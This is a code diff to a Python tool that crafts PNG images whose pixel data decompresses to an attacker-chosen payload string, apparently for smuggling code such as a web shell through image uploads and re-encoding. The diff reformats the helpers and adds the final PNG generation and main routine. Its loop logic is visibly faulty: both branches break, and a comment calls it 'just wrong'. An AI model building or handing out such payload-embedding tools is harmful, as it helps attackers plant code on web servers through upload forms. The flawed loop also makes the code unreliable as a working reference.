@@ -20,6 +20,7 @@ def parse_args():
     parser.add_argument("-o", dest="output", help="Output .png file", required=True)
     return parser.parse_args()
 
+
 def reverse_huffman(huffman):
     bitstream = ""
     for char in list(huffman):
@@ -78,14 +79,17 @@ def reverse_huffman(huffman):
 
     return "".join(chars)
 
+
 def gzdeflate(string):
     compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
     compressed = compressor.compress(string)
     compressed += compressor.flush()
     return compressed
 
+
 def to_ord_array(bin_string):
-	return [ord(char) for char in bin_string]
+    return [ord(char) for char in bin_string]
+
 
 def reverse_filter_1(bin_string):
     p = to_ord_array(bin_string)
@@ -100,6 +104,7 @@ def reverse_filter_1(bin_string):
         payload.append(filter1)
     return payload
 
+
 def reverse_filter_3(bin_string):
     p = to_ord_array(bin_string)
     s = len(p)
@@ -113,8 +118,55 @@ def reverse_filter_3(bin_string):
         payload.append(filter3)
     return payload
 
-def bypass_png_filter(inflate):
-	one = reverse_filter_1(inflate)
-	three = reverse_filter_3(inflate)
-	mergedlist = one + three
-	return mergedlist
+
+def bypass_png_filters(inflate):
+    one = reverse_filter_1(inflate)
+    three = reverse_filter_3(inflate)
+    mergedlist = one + three
+    return mergedlist
+
+
+def generate_final_payload(payload, png_output):
+    print("[i] Generating final PNG output")
+    # Thanks to admanLogue and hLk_886 for this PNG Code
+    im = Image.new("RGB", (32, 32))
+    i = 0
+    c = 0
+    while i < len(payload):
+        try:
+            r = payload[i]
+            g = payload[i + 1]
+            b = payload[i + 2]
+            im.putpixel((c, 0), (r, g, b))
+            i += 3
+            c += 1
+        except:
+            payload.append(255)
+
+    im.save(png_output)
+    print("[!] PNG output saved as: %s" % png_output + "\n")
+
+
+if __name__ == "__main__":
+    banner()
+    args = parse_args()
+
+    input2chunk = (args.payload).upper()
+    print("[i] Using payload: " + input2chunk + "\n")
+
+    failed = True
+    for i in range(0xFF, 0x01, -1):
+        reversed = reverse_huffman(chr(i) + input2chunk + chr(0))
+        deflated = gzdeflate(bytes(reversed, encoding="utf-8"))
+
+        ### TODO: this is just wrong
+        if input2chunk in str(deflated).upper():
+            break
+        else:
+            break
+
+    # print ("Deflated: "+str(deflated))
+    # print ("Reversed: "+str(reversed))
+
+    payload = bypass_png_filters(str(reversed))
+    generate_final_payload(payload, args.output)
